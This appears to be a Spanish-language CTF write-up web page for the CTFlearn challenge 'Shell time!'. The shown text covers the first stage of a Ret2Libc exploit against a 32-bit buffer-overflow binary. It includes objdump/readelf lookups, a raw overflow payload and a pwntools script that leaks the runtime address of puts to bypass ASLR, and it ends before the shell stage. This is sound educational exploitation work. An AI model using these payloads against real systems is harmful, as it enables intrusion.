<!doctype html><html lang=es>
<head>
<title>Shell time! | 7Rocky</title>
<meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
<meta name=viewport content="width=device-width,minimum-scale=1">
<meta name=description content="Este reto es la continuación de RIP my bof. Échale un vistazo si no lo has visto ya.
Ahora, la flag está en /flag2.txt, por lo que tenemos que conseguir algo más que redirigir la ejecución del programa a system(&#34;cat /flag.txt&#34;), como en RIP my bof.
Lo primero que pensé es Ret2Libc. La idea es obtener una consola de comandos llamando a system dentro de Glibc con argumento &#34;/bin/sh&#34;.
Para ese propósito, necesitamos burlar ASLR, porque Glibc es una librería de sistema y está afectada por la aleatorización de direcciones si ASLR está habilitado (probablemente sí).">
<meta name=robots content="index, follow">
<meta name=image content="https://7rocky.github.io/images/pwn.png">
<meta name=author content="7Rocky">
<meta property="og:title" content="Shell time!">
<meta property="og:description" content="Este reto es la continuación de RIP my bof. Échale un vistazo si no lo has visto ya.
Ahora, la flag está en /flag2.txt, por lo que tenemos que conseguir algo más que redirigir la ejecución del programa a system(&#34;cat /flag.txt&#34;), como en RIP my bof.
Lo primero que pensé es Ret2Libc. La idea es obtener una consola de comandos llamando a system dentro de Glibc con argumento &#34;/bin/sh&#34;.
Para ese propósito, necesitamos burlar ASLR, porque Glibc es una librería de sistema y está afectada por la aleatorización de direcciones si ASLR está habilitado (probablemente sí).">
<meta property="og:type" content="article">
<meta property="og:url" content="https://7rocky.github.io/ctf/ctflearn/binary/shell-time/"><meta property="article:section" content="ctf">
<meta property="article:modified_time" content="2022-02-19T11:21:49+01:00"><meta property="og:site_name" content="7Rocky">
<meta property="og:image" content="https://7rocky.github.io/images/pwn.png">
<meta property="og:author" content="7Rocky">
<meta itemprop=name content="Shell time!">
<meta itemprop=description content="Este reto es la continuación de RIP my bof. Échale un vistazo si no lo has visto ya.
Ahora, la flag está en /flag2.txt, por lo que tenemos que conseguir algo más que redirigir la ejecución del programa a system(&#34;cat /flag.txt&#34;), como en RIP my bof.
Lo primero que pensé es Ret2Libc. La idea es obtener una consola de comandos llamando a system dentro de Glibc con argumento &#34;/bin/sh&#34;.
Para ese propósito, necesitamos burlar ASLR, porque Glibc es una librería de sistema y está afectada por la aleatorización de direcciones si ASLR está habilitado (probablemente sí).">
<meta itemprop=dateModified content="2022-02-19T11:21:49+01:00">
<meta itemprop=wordCount content="2577">
<meta itemprop=keywords content>
<meta name=twitter:card content="summary">
<meta name=twitter:title content="Shell time!">
<meta name=twitter:description content="Este reto es la continuación de RIP my bof. Échale un vistazo si no lo has visto ya.
Ahora, la flag está en /flag2.txt, por lo que tenemos que conseguir algo más que redirigir la ejecución del programa a system(&#34;cat /flag.txt&#34;), como en RIP my bof.
Lo primero que pensé es Ret2Libc. La idea es obtener una consola de comandos llamando a system dentro de Glibc con argumento &#34;/bin/sh&#34;.
Para ese propósito, necesitamos burlar ASLR, porque Glibc es una librería de sistema y está afectada por la aleatorización de direcciones si ASLR está habilitado (probablemente sí).">
<meta name=twitter:image content="https://7rocky.github.io/images/pwn.png">
<meta name=twitter:author content="7Rocky">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-Z1HQGH3M4D',{anonymize_ip:!1})}</script>
<link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon>
<link href=/css/style.css rel=stylesheet>
<link href=/css/monokai-sublime.min.css rel=stylesheet>
<link href=/css/code.css rel=stylesheet>
<link href=/css/main.css rel=stylesheet>
<script src=/js/highlight.min.js></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script>
<script src=//mozilla.github.io/pdf.js/build/pdf.js></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script>
<script src=/js/main.js></script>
<div style=display:none>
$
\newcommand{\e}{e}
\newcommand{\N}[1][]{\mathbb{N}^{#1}}
\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
\newcommand{\R}[1][]{\mathbb{R}^{#1}}
\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
\newcommand{\C}[1][]{\mathbb{C}^{#1}}
\newcommand{\dx}{\,\mathrm{d}x}
\newcommand{\dy}{\,\mathrm{d}y}
\newcommand{\dz}{\,\mathrm{d}z}
\newcommand{\dt}{\,\mathrm{d}t}
\newcommand{\divides}{\, | \,}
\newcommand{\st}{\; | \;}
\renewcommand{\geq}{\geqslant}
\renewcommand{\leq}{\leqslant}
\renewcommand{\i}{\mathrm{i}}
\newcommand{\rank}{\mathop{\mathrm{rank}}}
\newcommand{\tr}{\mathop{\mathrm{tr}}}
\newcommand{\charField}{\mathop{\mathrm{char}}}
\newcommand{\Image}{\mathop{\mathrm{Im}}}
$
</div>
</head>
<body class="ma0 production">
<header>
<div class=bg-black>
<nav class="pv3 ph3 ph4-ns" role=navigation>
<div class="flex-l justify-between items-center center">
<a class="f3 fw2 hover-white no-underline white-90 dib" href=/ title=7Rocky>7Rocky</a>
<div class="flex-l items-center">
<a class="link-transition github link dib z-999 pt3 pt0-l mr3" href=/en/ctf/ctflearn/binary/shell-time/ title=en>
<img alt=en height=32px src=/images/en.png width=32px>
</a>
<ul class="pl0 ml3 mr3">
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/ctf/ title=CTF>CTF</a>
</li>
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/htb/ title=HTB>HTB</a>
</li>
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/imc/ title=IMC>IMC</a>
</li>
</ul>
<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
</div>
</div>
</nav>
</div>
</header>
<main class=pb7 role=main>
<article class="flex-l flex-wrap justify-between mw8 center ph3">
<header class="mt4 w-100">
<aside aria-label=aside class="instapaper_ignoref b helvetica tracked">BINARIOS</aside>
<div id=sharing class=mt3>
<a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/ctflearn/binary/shell-time/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a>
<a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/ctflearn/binary/shell-time/&text=Shell%20time!" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
<a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/ctf/ctflearn/binary/shell-time/&title=Shell%20time!" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
</div>
<h1 class="f1 mt3 mb1">Shell time!</h1>
<br>
</header>
<div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Este reto es la continuación de <a href=../rip-my-bof>RIP my bof</a>. Échale un vistazo si no lo has visto ya.</p>
<p>Ahora, la <em>flag</em> está en <code>/flag2.txt</code>, por lo que tenemos que conseguir algo más que redirigir la ejecución del programa a <code>system("cat /flag.txt")</code>, como en <a href=../rip-my-bof>RIP my bof</a>.</p>
<p>Lo primero que pensé es Ret2Libc. La idea es obtener una consola de comandos llamando a <code>system</code> dentro de Glibc con argumento <code>"/bin/sh"</code>.</p>
<p>Para ese propósito, necesitamos burlar ASLR, porque Glibc es una librería de sistema y está afectada por la aleatorización de direcciones si ASLR está habilitado (probablemente sí). Esto se puede hacer mediante una fuga (<em>leak</em>) de una dirección de alguna función de Glibc en tiempo de ejecución. Con esta información, podremos extraer los tres últimos dígitos hexadecimales y buscar por la versión de Glibc. Una vez que la tengamos, tendremos que obtener el <em>offset</em> de <code>system</code> y de la cadena <code>"/bin/sh"</code>. Esto se explicará mejor más adelante.</p>
<p>El binario se llama <code>server</code>, y es de 32 bits y tiene NX habilitado. Si lo ejecutamos, vemos la pila (<em>stack</em>) y el valor de <code>$eip</code> (lo cual es una ayuda para el reto <a href=../rip-my-bof>RIP my bof</a>). El texto de entrada se lee mediante <code>gets</code>, que es una función vulnerable a <em>Buffer Overflow</em>.</p>
<p>Para realizar la técnica de Ret2Libc, primero necesitamos una dirección de Glibc en tiempo de ejecución. Esto se puede hacer llamando a la función <code>puts</code> y pasándole como argumento la dirección de una función en la Tabla de <em>Offsets</em> Globales (<em>Global Offset Table</em>, GOT), de manera que el valor de esa dirección se imprima en la salida estándar (el valor de una entrada de la GOT es la dirección real de una función externa, si ya ha sido resuelta).</p>
<p>Para llamar a <code>puts</code>, tenemos que sobrescribir <code>$eip</code> con la entrada de <code>puts</code> en la Tabla de Enlaces a Procedimientos (<em>Procedure Linkage Table</em>, PLT), que contiene instrucciones que realizan un salto a la GOT o gestiona la resolución de la dirección si la entrada de la GOT está vacía.</p>
<p>La dirección de <code>puts</code> en la PLT se puede obtener con <code>objdump</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>objdump</span> -d server | <span class=code-dark-green>grep</span> puts
08048410 &lt;<span class=code-red>puts</span>@plt&gt;:
 8048704:       e8 07 fd ff ff          call   8048410 &lt;<span class=code-red>puts</span>@plt&gt;  
 8048716:       e8 f5 fc ff ff          call   8048410 &lt;<span class=code-red>puts</span>@plt&gt;
 8048846:       e8 c5 fb ff ff          call   8048410 &lt;<span class=code-red>puts</span>@plt&gt;
 8048881:       e8 8a fb ff ff          call   8048410 &lt;<span class=code-red>puts</span>@plt&gt;
</code></pre></div>
<p>Ahora necesitamos una dirección de la GOT, por ejemplo, la misma función <code>puts</code>. De nuevo, con <code>objdump</code> o con <code>readelf</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>objdump</span> -R server | <span class=code-dark-green>grep</span> puts
0804a018 R_386_JUMP_SLOT   <span class=code-red>puts</span>@GLIBC_2.0

<span class=code-cyan>$</span> <span class=code-dark-green>readelf</span> -r server | <span class=code-dark-green>grep</span> puts
0804a018  00000407 R_386_JUMP_SLOT   00000000   <span class=code-red>puts</span>@GLIBC_2.0  
</code></pre></div>
<p>Finalmente, necesitamos indicar una dirección de retorno. Como necesitaremos enviar otro <em>payload</em>, tenemos que ejecutar el programa otra vez pero sin cerrar el proceso. Por tanto, la instrucción de retorno tiene que ser la dirección del <code>main</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>objdump</span> -d server | <span class=code-dark-green>grep</span> main
08048430 &lt;__libc_start_<span class=code-red>main</span>@plt&gt;:
 804849d:       e8 8e ff ff ff          call   8048430 &lt;__libc_start_<span class=code-red>main</span>@plt&gt;  
08048640 &lt;<span class=code-red>main</span>&gt;:

<span class=code-cyan>$</span> <span class=code-dark-green>readelf</span> -s server | <span class=code-dark-green>grep</span> main
     7: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_<span class=code-red>main</span>@GLIBC_2.0 (2)
    61: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_<span class=code-red>main</span>@@GLIBC_
    73: 08048640    90 FUNC    GLOBAL DEFAULT   14 <span class=code-red>main</span>
</code></pre></div>
<p>Ahora que tenemos estos valores, podemos enviar el <em>payload</em>. Este estará formado por 60 bytes de relleno (tomado de <a href=../rip-my-bof>RIP my bof</a>), la dirección de <code>puts</code> en la PLT, la dirección de retorno (<code>main</code>) y el argumento para <code>puts</code> (que es la dirección de <code>puts</code> en la GOT).</p>
<p>Vamos a probarlo:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> -c <span class=code-dark-yellow>'import os; os.write(1, b"A" * 60 + b"\x10\x84\x04\x08" + b"\x40\x86\x04\x08" + b"\x18\xa0\x04\x08")'</span> | <span class=code-dark-green>./server</span>  

Legend: <span class=code-dark-green>buff</span> <span class=code-green>MODIFIED</span> <span class=code-dark-yellow>padding</span> <span class=code-yellow>MODIFIED</span>
  <span class=code-dark-blue>notsecret</span> <span class=code-blue>MODIFIED</span> <span class=code-dark-blue>secret</span> <span class=code-blue>MODIFIED</span>
  <span class=code-dark-red>return address</span> <span class=code-red>MODIFIED</span>
0xffea27a0 | <span class=code-dark-green>00 00 00 00 00 00 00 00</span> |
0xffea27a8 | <span class=code-dark-green>00 00 00 00 00 00 00 00</span> |
0xffea27b0 | <span class=code-dark-green>00 00 00 00 00 00 00 00</span> |
0xffea27b8 | <span class=code-dark-green>00 00 00 00 00 00 00 00</span> |
0xffea27c0 | <span class=code-dark-yellow>ff ff ff ff ff ff ff ff</span> |
0xffea27c8 | <span class=code-dark-yellow>ff ff ff ff ff ff ff ff</span> |
0xffea27d0 | <span class=code-white>80 75 f1 f7 00 a0 04 08</span> |
0xffea27d8 | <span class=code-white>e8 27 ea ff</span> <span class=code-dark-red>8b 86 04 08</span> |
Return address: 0x0804868b

Input some text:
Legend: <span class=code-dark-green>buff</span> <span class=code-green>MODIFIED</span> <span class=code-dark-yellow>padding</span> <span class=code-yellow>MODIFIED</span>
  <span class=code-dark-blue>notsecret</span> <span class=code-blue>MODIFIED</span> <span class=code-dark-blue>secret</span> <span class=code-blue>MODIFIED</span>
  <span class=code-dark-red>return address</span> <span class=code-red>MODIFIED</span>
0xffea27a0 | <span class=code-green>41 41 41 41 41 41 41 41</span> |
0xffea27a8 | <span class=code-green>41 41 41 41 41 41 41 41</span> |
0xffea27b0 | <span class=code-green>41 41 41 41 41 41 41 41</span> |
0xffea27b8 | <span class=code-green>41 41 41 41 41 41 41 41</span> |
0xffea27c0 | <span class=code-yellow>41 41 41 41 41 41 41 41</span> |
0xffea27c8 | <span class=code-yellow>41 41 41 41 41 41 41 41</span> |
0xffea27d0 | 41 41 41 41 41 41 41 41 |
0xffea27d8 | 41 41 41 41</span> <span class=code-red>10 84 04 08</span> |
Return address: 0x08048410

0@>

Legend: <span class=code-dark-green>buff</span> <span class=code-green>MODIFIED</span> <span class=code-dark-yellow>padding</span> <span class=code-yellow>MODIFIED</span>
  <span class=code-dark-blue>notsecret</span> <span class=code-blue>MODIFIED</span> <span class=code-dark-blue>secret</span> <span class=code-blue>MODIFIED</span>
  <span class=code-dark-red>return address</span> <span class=code-red>MODIFIED</span>
0xffea2790 | <span class=code-dark-green>00 00 00 00 00 00 00 00</span> |
0xffea2798 | <span class=code-dark-green>00 00 00 00 00 00 00 00</span> |
0xffea27a0 | <span class=code-dark-green>00 00 00 00 00 00 00 00</span> |
0xffea27a8 | <span class=code-dark-green>00 00 00 00 00 00 00 00</span> |
0xffea27b0 | <span class=code-dark-yellow>ff ff ff ff ff ff ff ff</span> |
0xffea27b8 | <span class=code-dark-yellow>ff ff ff ff ff ff ff ff</span> |
0xffea27c0 | <span class=code-white>80 75 f1 f7 00 a0 04 08</span> |
0xffea27c8 | <span class=code-white>d8 27 ea ff</span> <span class=code-dark-red>8b 86 04 08</span> |
Return address: 0x0804868b

Input some text:
Legend: <span class=code-dark-green>buff</span> <span class=code-green>MODIFIED</span> <span class=code-dark-yellow>padding</span> <span class=code-yellow>MODIFIED</span>
  <span class=code-dark-blue>notsecret</span> <span class=code-blue>MODIFIED</span> <span class=code-dark-blue>secret</span> <span class=code-blue>MODIFIED</span>
  <span class=code-dark-red>return address</span> <span class=code-red>MODIFIED</span>
0xffea2790 | <span class=code-dark-green>00 00 00 00 00 00 00 00</span> |
0xffea2798 | <span class=code-dark-green>00 00 00 00 00 00 00 00</span> |
0xffea27a0 | <span class=code-dark-green>00 00 00 00 00 00 00 00</span> |
0xffea27a8 | <span class=code-dark-green>00 00 00 00 00 00 00 00</span> |
0xffea27b0 | <span class=code-dark-yellow>ff ff ff ff ff ff ff ff</span> |
0xffea27b8 | <span class=code-dark-yellow>ff ff ff ff ff ff ff ff</span> |
0xffea27c0 | <span class=code-white>80 75 f1 f7 00 a0 04 08</span> |
0xffea27c8 | <span class=code-white>d8 27 ea ff</span> <span class=code-dark-red>8b 86 04 08</span> |
Return address: 0x0804868b

zsh: done                              python3 -c  |
zsh: segmentation fault (core dumped)  ./server
</code></pre></div>
<p>Aquí tenemos dos cosas: <code>main</code> se ha llamado dos veces y se ha producido la fuga de memoria (los caracteres <code>0@></code> y otros no imprimibles representan la dirección de <code>puts</code> de Glibc en tiempo de ejecución).</p>
<p>Ahora podemos crear un <em>exploit</em> en Python para extraer este valor y más adelante buscar una versión de Glibc:</p>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env</span> <span class=mtk3>python3</span>

<span class=mtk5>from</span> <span class="mtk8 mtku">pwn</span> <span class=mtk5>import</span> <span class=mtk5>*</span>

<span class=mtk1>context</span><span class=mtk1>.</span><span class=mtk1>binary</span> <span class=mtk5>=</span> <span class=mtk4>'server'</span>
<span class="mtk8 mtku">elf</span> <span class=mtk5>=</span> <span class=mtk1>context</span><span class=mtk1>.</span><span class=mtk1>binary</span>


<span class="mtk7 mtki">def</span> <span class=mtk8>main</span><span class=mtk1>():</span>
    <span class=mtk1>p</span> <span class=mtk5>=</span> <span class="mtku mtk8">elf</span><span class=mtk1>.process()</span>

    <span class=mtk1>main_addr</span>     <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>8048640</span>
    <span class=mtk1>puts_plt_addr</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>8048410</span>
    <span class=mtk1>puts_got_addr</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>804a018</span>

    <span class=mtk1>offset</span> <span class=mtk5>=</span> <span class=mtk6>60</span>
    <span class=mtk1>junk</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'A'</span> <span class=mtk5>*</span> <span class=mtk1>offset</span>

    <span class=mtk1>payload</span>  <span class=mtk5>=</span> <span class=mtk1>junk</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32(</span><span class=mtk1>puts_plt_addr</span><span class=mtk1>)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32(</span><span class=mtk1>main_addr</span><span class=mtk1>)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32(</span><span class=mtk1>puts_got_addr</span><span class=mtk1>)</span>

    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Input</span> <span class=mtk4>some</span> <span class=mtk4>text:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>payload</span><span class=mtk1>)</span>
    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>recvuntil</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Return</span> <span class=mtk4>address'</span><span class=mtk1>)</span>
    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>recvline</span><span class=mtk1>()</span>
    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>recvline</span><span class=mtk1>()</span>

    <span class=mtk1>puts_addr</span> <span class=mtk5>=</span> <span class=mtk1>u32(</span><span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>recvline</span><span class=mtk1>().</span><span class=mtk8>strip</span><span class=mtk1>()[:</span><span class=mtk6>4</span><span class=mtk1>])</span>
    <span class=mtk1>log</span><span class=mtk1>.</span><span class=mtk8>info</span><span class=mtk1>(</span><span class="mtk7 mtki">f</span><span class=mtk4>'Leaked</span> <span class=mtk4>puts()</span> <span class=mtk4>address:</span> <span class=mtk6>{</span><span class=mtk8>hex</span><span class=mtk1>(</span><span class=mtk1>puts_addr</span><span class=mtk1>)</span><span class=mtk6>}</span><span class=mtk4>'</span><span class=mtk1>)</span>  


<span class=mtk5>if</span> <span class=mtk1>__name__</span> <span class=mtk5>==</span> <span class=mtk4>'__main__'</span><span class=mtk1>:</span>
    <span class=mtk8>main</span><span class=mtk1>()</span>
</code></pre></div>
<p>Si lo ejecutamos, tenemos la dirección de <code>puts</code> en tiempo de ejecución:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py
[<span class=code-blue>*</span>] './server'
    Arch:     i386-32-little
    RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
    Stack:    <span class=code-dark-red>No canary found</span>
    NX:       <span class=code-dark-green>NX enabled</span>
    PIE:      <span class=code-dark-red>No PIE (0x8048000)</span>
[<span class=code-green>+</span>] Starting local process './server': pid 1746785  
[<span class=code-blue>*</span>] Leaked puts() address: 0xf7e3b290
[<span class=code-blue>*</span>] Switching to interactive mode

Legend: <span class=code-dark-green>buff</span> <span class=code-green>MODIFIED</span> <span class=code-dark-yellow>padding</span> <span class=code-yellow>MODIFIED</span>
  <span class=code-dark-blue>notsecret</span> <span class=code-blue>MODIFIED</span> <span class=code-dark-blue>secret</span> <span class=code-blue>MODIFIED</span>
  <span class=code-dark-red>return address</span> <span class=code-red>MODIFIED</span>
0xff94ee90 | <span class=code-dark-green>00 00 00 00 00 00 00 00</span> |
0xff94ee98 | <span class=code-dark-green>00 00 00 00 00 00 00 00</span> |
0xff94eea0 | <span class=code-dark-green>00 00 00 00 00 00 00 00</span> |
0xff94eea8 | <span class=code-dark-green>00 00 00 00 00 00 00 00</span> |
0xff94eeb0 | <span class=code-dark-yellow>ff ff ff ff ff ff ff ff</span> |
0xff94eeb8 | <span class=code-dark-yellow>ff ff ff ff ff ff ff ff</span> |
0xff94eec0 | <span class=code-white>80 15 fb f7 00 a0 04 08</span> |
0xff94eec8 | <span class=code-white>d8 ee 94 ff</span> <span class=code-dark-red>8b 86 04 08</span> |
Return address: 0x0804868b

Input some text: <span class=code-red>$</span>
</code></pre></div>
<p>Utilizar <code>context.log_level = 'DEBUG'</code> puede ser útil si se utiliza <code>pwntools</code> porque todos los datos enviados y recibidos se muestran como bytes en hexadecimal.</p>
<p>Por el momento, vamos a terminar el <em>exploit</em> en local. Ahora que tenemos la dirección real de <code>puts</code> y el programa reiniciado en el <code>main</code>, tenemos otra oportunidad para mandar otro <em>payload</em>. Además, podemos calcular la dirección base de Glibc.</p>
<p>ASLR funciona de tal manera que solamente se genera una dirección base aleatoria, y las direcciones de las funciones se calculan utilizando <em>offsets</em>. Podemos obtener el <em>offset</em> de <code>puts</code> en la librería Glibc local:</p>
